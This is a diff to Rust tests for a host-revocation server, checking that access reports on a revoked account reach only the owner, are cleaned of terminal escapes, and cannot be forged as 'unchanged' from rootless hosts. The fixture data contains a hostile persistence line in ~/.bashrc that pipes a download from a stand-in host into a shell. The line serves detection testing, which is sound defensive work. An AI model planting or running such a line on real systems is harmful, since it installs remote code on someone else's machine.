@@ -185,6 +185,118 @@ async fn authorized_host_revocation_retains_cleanup_after_authority_retirement()
     eprintln!("login_cleanup pending_after_retirement=true durable_reconnect_confirmed=true");
 }
 
+/// The reports waiting in `owner`'s Inbox (D398).
+async fn waiting(fixture: &LoginHost, owner: &str) -> Vec<crate::access_report::Waiting> {
+    crate::access_report::inbox(&fixture.pool, owner)
+        .await
+        .unwrap()
+        .reports
+}
+
+/// D356, D398: the access report a host returns when its person is revoked
+/// (and the host stays) reaches the owner's Inbox through the cleanup outbox.
+/// It is kept with the receipt that confirms the revocation, cleaned of
+/// terminal escapes, with D353's warning, readable by the host's owner only,
+/// and absent until the host confirms.
+#[tokio::test]
+async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
+    let fixture = login_host(None).await;
+    let retirement = pending_retirement(&fixture).await;
+    let owner = fixture.person.to_string();
+    assert!(
+        waiting(&fixture, &owner).await.is_empty(),
+        "a report existed before the host confirmed"
+    );
+    let extra = serde_json::json!({
+        "warning": "Background programs of this host account may still be running.",
+        "access": {"state":"changed","accounts":[{"account":"deploy","state":"changed","files":[
+            {"path":"~/.ssh/authorized_keys","change":"changed","lines":["ssh-ed25519 AAAAleft left-behind"]},
+            {"path":"~/.bashrc","change":"changed","lines":["curl -s http://example.invalid/x | sh\u{1b}[2J"]},
+            {"path":"~/.profile","change":"added","lines":[],"note":"a symbolic link to /etc/passwd; not followed"}
+        ],"truncated":false,"unscanned":[],"omitted_files":0}]}
+    });
+    reconnect_cleanup_reporting(&fixture, Some(true), Some(extra)).await;
+    retirement.await.unwrap().unwrap();
+    let reports = waiting(&fixture, &owner).await;
+    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
+    let (person, report) = (&reports[0].person, &reports[0].report);
+    assert_eq!(*person, fixture.person);
+    assert_eq!(reports[0].host, fixture.host);
+    // This fixture host is rootless: the server, not the host, says the
+    // report cannot be vouched for, and keeps the files as hints.
+    assert_eq!(report.state, crate::access_report::State::NotChecked);
+    assert_eq!(
+        report.reason,
+        Some(crate::access_report::Reason::RootlessUnverified)
+    );
+    assert!(report.warning.is_some(), "D353's warning was dropped");
+    let account = &report.accounts[0];
+    assert_eq!(account.account, "deploy");
+    let paths: Vec<&str> = account
+        .files
+        .iter()
+        .map(|file| file.path.as_str())
+        .collect();
+    assert_eq!(paths, ["~/.ssh/authorized_keys", "~/.bashrc", "~/.profile"]);
+    assert_eq!(account.files[0].lines, ["ssh-ed25519 AAAAleft left-behind"]);
+    assert_eq!(
+        account.files[1].lines,
+        ["curl -s http://example.invalid/x | sh\u{fffd}[2J"]
+    );
+    assert!(
+        waiting(&fixture, "owner").await.is_empty(),
+        "another account read this host's report"
+    );
+}
+
+/// J322 P2: an agent older than D356 confirms with no report. The owner
+/// reads "not checked: older agent", never "nothing changed".
+#[tokio::test]
+async fn an_older_agents_revocation_reads_not_checked() {
+    let fixture = login_host(None).await;
+    let retirement = pending_retirement(&fixture).await;
+    reconnect_cleanup(&fixture, Some(true)).await;
+    retirement.await.unwrap().unwrap();
+    let reports = waiting(&fixture, &fixture.person.to_string()).await;
+    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
+    assert_eq!(
+        reports[0].report.state,
+        crate::access_report::State::NotChecked
+    );
+    assert_eq!(
+        reports[0].report.reason,
+        Some(crate::access_report::Reason::RootlessUnverified),
+        "a rootless host's report is never vouched for, older agent or not"
+    );
+}
+
+/// J334 P1-3: on a rootless host the account owns the infraternal agent, so
+/// it can answer "unchanged, complete". The server takes the host's mode
+/// from its own record and stores `not_checked` with `rootless_unverified`.
+#[tokio::test]
+async fn a_rootless_host_cannot_claim_unchanged() {
+    let fixture = login_host(None).await;
+    let retirement = pending_retirement(&fixture).await;
+    let forged = serde_json::json!({"access": {"state": "unchanged", "accounts": [{
+        "account": "deploy", "state": "unchanged", "files": [], "truncated": false,
+        "unscanned": [], "omitted_files": 0, "complete": true, "watched": 999,
+        "privileged": false, "shared": false, "programs_may_remain": false,
+        "recorded_at": 1, "scanned_at": 2
+    }]}});
+    reconnect_cleanup_reporting(&fixture, Some(true), Some(forged)).await;
+    retirement.await.unwrap().unwrap();
+    let reports = waiting(&fixture, &fixture.person.to_string()).await;
+    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
+    assert_eq!(
+        reports[0].report.state,
+        crate::access_report::State::NotChecked
+    );
+    assert_eq!(
+        reports[0].report.accounts[0].reason,
+        Some(crate::access_report::Reason::RootlessUnverified)
+    );
+}
+
 /// Offline cleanup cuts normal authority but cannot complete retirement.
 #[tokio::test]
 async fn unconfirmed_person_cleanup_does_not_block_host_authority_cut() {
@@ -289,6 +401,16 @@ async fn cleanup_disconnected(host: Uuid) {
 /// Reconnect a tombstoned host using its real enrolled mTLS identity. The only
 /// admitted request must be the persisted person's cleanup, never a new login.
 async fn reconnect_cleanup(fixture: &LoginHost, durable: Option<bool>) {
+    reconnect_cleanup_reporting(fixture, durable, None).await;
+}
+
+/// [`reconnect_cleanup`] whose durable reply also carries the fields of
+/// `extra` (D356's `access` report, D353's `warning`), as a host returns them.
+async fn reconnect_cleanup_reporting(
+    fixture: &LoginHost,
+    durable: Option<bool>,
+    extra: Option<serde_json::Value>,
+) {
     let connection = remote_tls::dial(
         fixture.listeners.local_addr().unwrap(),
         "localhost",
@@ -326,7 +448,7 @@ async fn reconnect_cleanup(fixture: &LoginHost, durable: Option<bool>) {
         assert_eq!(action_id, "terminal.login.revoke");
         assert_eq!(
             serde_json::from_slice::<serde_json::Value>(input_json).unwrap(),
-            serde_json::json!({"person": fixture.person})
+            serde_json::json!({"person": fixture.person, "report": true}),
         );
         let Some(durable) = durable else {
             // Dropping the socket after receipt models a lost acknowledgement.
@@ -334,7 +456,13 @@ async fn reconnect_cleanup(fixture: &LoginHost, durable: Option<bool>) {
             cleanup_disconnected(fixture.host).await;
             return;
         };
-        let json = serde_json::json!({"revoked": durable}).to_string();
+        let mut reply = serde_json::json!({"revoked": durable});
+        if let Some(serde_json::Value::Object(fields)) = &extra {
+            for (name, value) in fields {
+                reply[name] = value.clone();
+            }
+        }
+        let json = reply.to_string();
         Transmit::default()
             .send(
                 &connection.channel,
@@ -633,4 +761,83 @@ async fn cleanup_delivery_returns_handshake_admission_before_waiting() {
     retirement.abort();
     let _ = retirement.await;
     fixture.peer.abort();
+}
+
+/// Refused default removals must not send even the preliminary host revoke.
+#[tokio::test]
+async fn refused_removal_leaves_the_connected_host_untouched() {
+    for refusal in [
+        "session",
+        "expired_session",
+        "window",
+        "revoked_key",
+        "key_scope",
+    ] {
+        let mut fixture = login_host(Some(true)).await;
+        let now = crate::runtime::unix_seconds().unwrap();
+        let token = "j347-removal-session";
+        let hash = crate::auth::hash(token);
+        sqlx::query("INSERT INTO sessions(token_hash,user_id,device,expires,fresh,unlocked) VALUES(?,?,'fixture',?,?,1)")
+            .bind(&hash).bind(fixture.person.to_string()).bind(now + 3600).bind(now).execute(&fixture.pool).await.unwrap();
+        let auth = crate::auth::Auth::new(
+            fixture.pool.clone(),
+            "removal.example.test",
+            "https://removal.example.test",
+        )
+        .await
+        .unwrap();
+        let removal = crate::remote_removal::Removal::new(
+            auth,
+            fixture.pool.clone(),
+            fixture.store.clone(),
+            fixture.listeners.diagnostic_hosts.clone(),
+            std::path::PathBuf::new(),
+        );
+        let result = if matches!(refusal, "session" | "expired_session" | "window") {
+            let review = removal.start(token, fixture.host, true, now).await.unwrap();
+            let sql = if refusal == "session" {
+                "DELETE FROM sessions WHERE token_hash=?"
+            } else if refusal == "expired_session" {
+                "UPDATE sessions SET expires=1 WHERE token_hash=?"
+            } else {
+                "UPDATE sessions SET fresh=1 WHERE token_hash=?"
+            };
+            sqlx::query(sql)
+                .bind(&hash)
+                .execute(&fixture.pool)
+                .await
+                .unwrap();
+            removal
+                .finish_host(token, fixture.host, review["review"].as_str().unwrap(), now)
+                .await
+        } else {
+            let (scopes, dead) = if refusal == "revoked_key" {
+                ("[\"hosts:write\"]", 1)
+            } else {
+                ("[\"hosts:read\"]", 0)
+            };
+            sqlx::query("INSERT INTO api_keys(token_hash,user_id,device,scopes,renewed_at,expires_at,dead) VALUES(?,?,'fixture',?,?,?,?)")
+                .bind(&hash).bind(fixture.person.to_string()).bind(scopes).bind(now).bind(now + 3600).bind(dead).execute(&fixture.pool).await.unwrap();
+            removal
+                .remove_with_key(&hash, &fixture.person.to_string(), fixture.host, 0, now)
+                .await
+        };
+        assert!(result.is_err(), "{refusal} removal was accepted");
+        assert!(
+            matches!(
+                fixture.observed.try_recv(),
+                Err(tokio::sync::oneshot::error::TryRecvError::Empty)
+            ),
+            "{refusal} sent a host revoke before refusing removal"
+        );
+        let pending: i64 =
+            sqlx::query_scalar("SELECT count(*) FROM remote_host_removals WHERE host_id=?")
+                .bind(fixture.host.as_bytes().as_slice())
+                .fetch_one(&fixture.pool)
+                .await
+                .unwrap();
+        assert_eq!(pending, 0);
+        fixture.peer.abort();
+        let _ = fixture.peer.await;
+    }
 }
